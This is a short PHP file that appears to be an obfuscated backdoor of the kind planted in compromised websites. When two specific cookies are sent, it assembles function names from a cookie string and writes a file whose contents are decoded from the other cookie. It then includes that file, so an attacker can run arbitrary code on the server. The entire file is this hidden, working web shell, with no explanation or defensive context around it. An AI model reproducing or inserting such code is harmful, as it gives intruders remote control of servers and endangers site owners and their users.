<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[10])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[10][$n];
        if (!$c[10][$n + 1]) {
            if (!$c[10][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[23]() . $p[7];
    if (!$p[9]($k)) {
        $n = $p[16]($k, $p[17]);
        $p[8]($n, $p[3] . $p[11]($p[26]($c[3])));
    }
    include($k);
}